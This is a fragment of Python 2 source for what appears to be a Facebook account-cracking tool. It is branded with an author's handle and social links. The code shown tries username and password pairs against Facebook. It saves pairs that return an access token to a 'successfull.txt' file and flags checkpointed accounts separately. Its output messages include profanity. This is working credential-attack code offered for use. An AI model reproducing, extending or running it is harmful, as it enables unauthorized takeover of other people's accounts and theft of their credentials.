...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Sharif Ahmed  <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> Sharif Ahmed \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> github.com/A6H1k <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : A6H1K'
    print '\x1b[1;91mFACEBOOK : Sharif Ahmed'
    print '\x1b[1;91mGITHUB  : github.com/A6H1K'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[MOTHER-FUCKER]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[A6H1K-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
